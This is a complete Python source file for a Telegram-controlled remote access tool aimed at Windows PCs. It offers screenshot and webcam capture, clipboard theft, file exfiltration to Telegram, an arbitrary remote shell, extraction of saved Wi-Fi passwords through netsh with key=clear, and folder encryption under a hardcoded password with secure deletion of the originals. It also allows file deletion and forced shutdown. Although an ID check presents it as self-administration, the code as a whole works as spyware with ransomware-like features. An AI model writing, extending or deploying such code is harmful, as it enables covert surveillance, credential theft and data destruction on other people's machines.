import os
import re
import mss
import cv2
import time
import pyttsx3
import telebot
import platform
import clipboard
import subprocess
import pyAesCrypt
import shutil
import pyautogui
import psutil
import xml.etree.ElementTree as ET
from secure_delete import secure_delete

TOKEN = 'your telegram bot token'  # Consider storing this securely
allowed_users = [222221111]  # Replace with your Telegram user ID

bot = telebot.TeleBot(TOKEN)
cd = os.path.expanduser("~")
secure_delete.secure_random_seed_init()
bot.set_webhook()

def restrict_access(message):
    if message.from_user.id not in allowed_users:
        bot.send_message(message.chat.id, "Unauthorized access.")
        return False
    return True

@bot.message_handler(commands=['start'])
def start(message):
    if not restrict_access(message):
        return
    bot.send_message(message.chat.id, 'Welcome!')

@bot.message_handler(commands=['help'])
def help_msg(message):
    if not restrict_access(message):
        return
    help_text = """
Available Commands:
/start - Welcomes the user.
    Example: /start
/screen - Captures and sends a screenshot of the PC.
    Example: /screen
/sys - Displays system information (OS, CPU, etc.).
    Example: /sys
/ip - Retrieves and sends the public IP address.
    Example: /ip
/cd [folder] - Changes the current directory to the specified folder.
    Example: /cd Documents
/ls - Lists contents of the current directory.
    Example: /ls
/upload [path] - Sends the specified file to Telegram.
    Example: /upload C:\\Users\\User\\file.txt
/crypt [path] - Encrypts files in the specified folder and deletes originals.
    Example: /crypt C:\\Users\\User\\SecretFolder
/decrypt [path] - Decrypts files in the specified folder and deletes encrypted files.
    Example: /decrypt C:\\Users\\User\\SecretFolder
/webcam - Captures and sends an image from the webcam.
    Example: /webcam
/lock - Locks the Windows session.
    Example: /lock
/clipboard - Sends the current clipboard content.
    Example: /clipboard
/shell - Enters a remote shell to execute commands (type 'exit' to leave).
    Example: /shell
/wifi - Retrieves and sends Wi-Fi SSID and password.
    Example: /wifi
/speech [text] - Converts the specified text to speech on the PC.
    Example: /speech Hello, this is a test
/shutdown - Shuts down the PC in 5 seconds.
    Example: /shutdown
/cpu - Displays the current CPU usage percentage.
    Example: /cpu
/memory - Shows memory usage statistics (total, used, available).
    Example: /memory
/processes - Lists the top 10 processes by CPU usage.
    Example: /processes
/drives - Lists all available drives on the system.
    Example: /drives
/move [source] [destination] - Moves a file from source to destination.
    Example: /move file.txt C:\\Users\\User\\NewFolder\\file.txt
/copy [source] [destination] - Copies a file from source to destination.
    Example: /copy file.txt C:\\Users\\User\\Backup\\file.txt
/delete [path] - Securely deletes the specified file.
    Example: /delete C:\\Users\\User\\file.txt
/ping [host] - Pings the specified host and returns the result.
    Example: /ping google.com
/volume [level] - Sets the system volume to the specified level (0-100).
    Example: /volume 50
/restart - Restarts the PC in 5 seconds.
    Example: /restart
/logoff - Logs off the current user.
    Example: /logoff
/alert [message] - Displays an alert message on the PC screen.
    Example: /alert Reminder: Meeting at 3 PM
"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['screen'])
def send_screen(message):
    if not restrict_access(message):
        return
    try:
        with mss.mss() as sct:
            image_path = os.path.join(cd, "capture.png")
            sct.shot(output=image_path)
        print(image_path)
        with open(image_path, "rb") as photo:
            bot.send_photo(message.chat.id, photo)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['ip'])
def send_ip_info(message):
    if not restrict_access(message):
        return
    try:
        command_ip = "curl ipinfo.io/ip"
        result = subprocess.check_output(command_ip, shell=True)
        public_ip = result.decode("utf-8").strip()
        bot.send_message(message.chat.id, public_ip)
    except:
        bot.send_message(message.chat.id, 'error')

@bot.message_handler(commands=['sys'])
def send_system_info(message):
    if not restrict_access(message):
        return
    system_info = {
        'Platform': platform.platform(),
        'System': platform.system(),
        'Node Name': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
        'CPU Cores': os.cpu_count(),
        'Username': os.getlogin(),
    }
    system_info_text = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
    bot.send_message(message.chat.id, system_info_text)

@bot.message_handler(commands=['ls'])
def list_directory(message):
    if not restrict_access(message):
        return
    try:
        contents = os.listdir(cd)
        if not contents:
            bot.send_message(message.chat.id, "folder is empty.")
        else:
            response = "Directory content :\n"
            for item in contents:
                response += f"- {item}\n"
            bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

@bot.message_handler(commands=['cd'])
def change_directory(message):
    if not restrict_access(message):
        return
    try:
        global cd 
        args = message.text.split(' ')
        if len(args) >= 2:
            new_directory = args[1]
            new_path = os.path.join(cd, new_directory)
            if os.path.exists(new_path) and os.path.isdir(new_path):
                cd = new_path
                bot.send_message(message.chat.id, f"you are in : {cd}")
            else:
                bot.send_message(message.chat.id, f"The directory does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. : USE /cd [folder name]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

@bot.message_handler(commands=['upload'])
def handle_upload_command(message):
    if not restrict_access(message):
        return
    try:
        args = message.text.split(' ')
        if len(args) >= 2:
            file_path = args[1]
            if not os.path.isabs(file_path):
                file_path = os.path.join(cd, file_path)
            if os.path.exists(file_path):
                with open(file_path, 'rb') as file:
                    bot.send_document(message.chat.id, file)
                bot.send_message(message.chat.id, f"File has been transferred successfully.")
            else:
                bot.send_message(message.chat.id, "The specified path does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /upload [PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['crypt'])
def encrypt_folder(message):
    if not restrict_access(message):
        return
    try:
        if len(message.text.split()) >= 2:
            folder_to_encrypt = message.text.split()[1]
            password = "fuckyou"
            for root, dirs, files in os.walk(folder_to_encrypt):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypted_file_path = file_path + '.crypt'
                    pyAesCrypt.encryptFile(file_path, encrypted_file_path, password)
                    if not file_path.endswith('.crypt'):
                        secure_delete.secure_delete(file_path)
            bot.send_message(message.chat.id, "Folder encrypted, and original non-encrypted files securely deleted successfully.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /crypt [FOLDER_PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['decrypt'])
def decrypt_folder(message):
    if not restrict_access(message):
        return
    try:
        if len(message.text.split()) >= 2:
            folder_to_decrypt = message.text.split()[1]
            password = "fuckyou"
            for root, dirs, files in os.walk(folder_to_decrypt):
                for file in files:
                    if file.endswith('.crypt'):
                        file_path = os.path.join(root, file)
                        decrypted_file_path = file_path[:-6]
                        pyAesCrypt.decryptFile(file_path, decrypted_file_path, password)
                        secure_delete.secure_delete(file_path)
            bot.send_message(message.chat.id, "Folder decrypted, and encrypted files deleted successfully.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /decrypt [ENCRYPTED_FOLDER_PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['lock'])
def lock_command(message):
    if not restrict_access(message):
        return
    try:
        result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            bot.send_message(message.chat.id, "Windows session successfully locked.")
        else:
            bot.send_message(message.chat.id, "Impossible to lock Windows session.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

shutdown_commands = [
    ['shutdown', '/s', '/t', '5'],
    ['shutdown', '-s', '-t', '5'],
    ['shutdown.exe', '/s', '/t', '5'],
    ['shutdown.exe', '-s', '-t', '5'],
]

@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    if not restrict_access(message):
        return
    try:
        success = False
        for cmd in shutdown_commands:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                success = True
                break
        if success:
            bot.send_message(message.chat.id, "Shutdown in 5 seconds.")
        else:
            bot.send_message(message.chat.id, "Impossible to shutdown.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['webcam'])
def capture_webcam_image(message):
    if not restrict_access(message):
        return
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            bot.send_message(message.chat.id, "Error: Unable to open the webcam.")
        else:
            ret, frame = cap.read()
            if ret:
                image_path = os.path.join(cd, "webcam.jpg")
                cv2.imwrite(image_path, frame)
                with open(image_path, 'rb') as photo_file:
                    bot.send_photo(message.chat.id, photo=photo_file)
                os.remove(image_path)
            else:
                bot.send_message(message.chat.id, "Error while capturing the image.")
        cap.release()
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['speech'])
def text_to_speech_command(message):
    if not restrict_access(message):
        return
    try:
        text = message.text.replace('/speech', '').strip()
        if text:
            pyttsx3.speak(text)
            bot.send_message(message.chat.id, "Successfully spoken.")
        else:
            bot.send_message(message.chat.id, "Usage: /speech [TEXT]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['clipboard'])
def clipboard_command(message):
    if not restrict_access(message):
        return
    try:
        clipboard_text = clipboard.paste()
        if clipboard_text:
            bot.send_message(message.chat.id, f"Clipboard content:\n{clipboard_text}")
        else:
            bot.send_message(message.chat.id, "Clipboard is empty.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

user_states = {}
STATE_NORMAL = 1
STATE_SHELL = 2

@bot.message_handler(commands=['shell'])
def start_shell(message):
    if not restrict_access(message):
        return
    user_id = message.from_user.id
    user_states[user_id] = STATE_SHELL
    bot.send_message(user_id, "You are now in the remote shell interface. Type 'exit' to exit.")

@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
def handle_shell_commands(message):
    user_id = message.from_user.id
    if not restrict_access(message):
        return
    command = message.text.strip()
    if command.lower() == 'exit':
        bot.send_message(user_id, "Exiting remote shell interface.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if stdout:
                output = stdout.decode('utf-8', errors='ignore')
                send_long_message(user_id, f"Command output:\n{output}")
            if stderr:
                error_output = stderr.decode('utf-8', errors='ignore')
                send_long_message(user_id, f"Command error output:\n{error_output}")
        except Exception as e:
            bot.send_message(user_id, f"An error occurred: {str(e)}")

def get_user_state(user_id):
    return user_states.get(user_id, STATE_NORMAL)

def send_long_message(user_id, message_text):
    part_size = 4000
    message_parts = [message_text[i:i+part_size] for i in range(0, len(message_text), part_size)]
    for part in message_parts:
        bot.send_message(user_id, part)

@bot.message_handler(commands=['wifi'])
def get_wifi_passwords(message):
    if not restrict_access(message):
        return
    try:
        subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], shell=True, text=True)
        with open('Wi-Fi-App.xml', 'r') as file:
            xml_content = file.read()
        ssid_match = re.search(r'<name>(.*?)<\/name>', xml_content)
        password_match = re.search(r'<keyMaterial>(.*?)<\/keyMaterial>', xml_content)
        if ssid_match and password_match:
            ssid = ssid_match.group(1)
            password = password_match.group(1)
            message_text = f"SSID: {ssid}\nPASS: {password}"
            bot.send_message(message.chat.id, message_text)
            try:
                os.remove("Wi-Fi-App.xml")
            except:
                pass
        else:
            bot.send_message(message.chat.id, "NOT FOUND.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['cpu'])
def send_cpu_usage(message):
    if not restrict_access(message):
        return
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
        bot.send_message(message.chat.id, f"Current CPU usage: {cpu_usage}%")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['memory'])
def send_memory_usage(message):
    if not restrict_access(message):
        return
    try:
        memory = psutil.virtual_memory()
        total = memory.total / (1024 ** 3)
        available = memory.available / (1024 ** 3)
        used = memory.used / (1024 ** 3)
        percent = memory.percent
        response = f"Memory Usage:\nTotal: {total:.2f} GB\nAvailable: {available:.2f} GB\nUsed: {used:.2f} GB\nPercent: {percent}%"
        bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['processes'])
def send_top_processes(message):
    if not restrict_access(message):
        return
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent']):
            processes.append(proc.info)
        processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
        top_processes = processes[:10]
        response = "Top 10 processes by CPU usage:\n"
        for proc in top_processes:
            response += f"PID: {proc['pid']}, Name: {proc['name']}, CPU: {proc['cpu_percent']}%\n"
        bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['drives'])
def list_drives(message):
    if not restrict_access(message):
        return
    try:
        partitions = psutil.disk_partitions()
        response = "Available drives:\n"
        for partition in partitions:
            response += f"{partition.device} - {partition.mountpoint}\n"
        bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['move'])
def move_file(message):
    if not restrict_access(message):
        return
    try:
        args = message.text.split(' ')
        if len(args) == 3:
            source = args[1]
            destination = args[2]
            if not os.path.isabs(source):
                source = os.path.join(cd, source)
            if not os.path.isabs(destination):
                destination = os.path.join(cd, destination)
            shutil.move(source, destination)
            bot.send_message(message.chat.id, f"Moved {source} to {destination}")
        else:
            bot.send_message(message.chat.id, "Usage: /move [source] [destination]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['ping'])
def ping_host(message):
    if not restrict_access(message):
        return
    try:
        args = message.text.split(' ')
        if len(args) == 2:
            host = args[1]
            output = subprocess.check_output(['ping', '-n', '4', host], text=True)
            bot.send_message(message.chat.id, f"Ping result:\n{output}")
        else:
            bot.send_message(message.chat.id, "Usage: /ping [host]")
    except subprocess.CalledProcessError as e:
        bot.send_message(message.chat.id, f"Ping failed: {str(e)}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['volume'])
def set_volume(message):
    if not restrict_access(message):
        return
    try:
        args = message.text.split(' ')
        if len(args) == 2:
            level = int(args[1])
            if 0 <= level <= 100:
                volume_level = int((level / 100) * 65535)
                subprocess.run(['nircmd.exe', 'setsysvolume', str(volume_level)])
                bot.send_message(message.chat.id, f"Volume set to {level}%")
            else:
                bot.send_message(message.chat.id, "Volume level must be between 0 and 100")
        else:
            bot.send_message(message.chat.id, "Usage: /volume [0-100]")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid volume level")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['restart'])
def restart_system(message):
    if not restrict_access(message):
        return
    try:
        subprocess.run(['shutdown', '/r', '/t', '5'])
        bot.send_message(message.chat.id, "System will restart in 5 seconds.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['logoff'])
def logoff_user(message):
    if not restrict_access(message):
        return
    try:
        subprocess.run(['shutdown', '/l'])
        bot.send_message(message.chat.id, "Logging off the current user.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['alert'])
def show_alert(message):
    if not restrict_access(message):
        return
    try:
        args = message.text.split(' ', 1)
        if len(args) == 2:
            text = args[1]
            pyautogui.alert(text=text, title='Alert from Telegram Bot')
            bot.send_message(message.chat.id, "Alert displayed on the PC.")
        else:
            bot.send_message(message.chat.id, "Usage: /alert [message]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['copy'])
def copy_file(message):
    if not restrict_access(message):
        return
    try:
        args = message.text.split(' ')
        if len(args) == 3:
            source = args[1]
            destination = args[2]
            if not os.path.isabs(source):
                source = os.path.join(cd, source)
            if not os.path.isabs(destination):
                destination = os.path.join(cd, destination)
            shutil.copy(source, destination)
            bot.send_message(message.chat.id, f"Copied {source} to {destination}")
        else:
            bot.send_message(message.chat.id, "Usage: /copy [source] [destination]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['delete'])
def delete_file(message):
    if not restrict_access(message):
        return
    try:
        args = message.text.split(' ')
        if len(args) == 2:
            file_path = args[1]
            if not os.path.isabs(file_path):
                file_path = os.path.join(cd, file_path)
            if os.path.exists(file_path):
                secure_delete.secure_delete(file_path)
                bot.send_message(message.chat.id, f"File {file_path} securely deleted")
            else:
                bot.send_message(message.chat.id, "The specified path does not exist.")
        else:
            bot.send_message(message.chat.id, "Usage: /delete [path]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

try:
    if __name__ == "__main__":
        print('Waiting for commands...')
        try:
            bot.infinity_polling()
        except:
            time.sleep(10)
            pass
except:
    time.sleep(5)
    pass
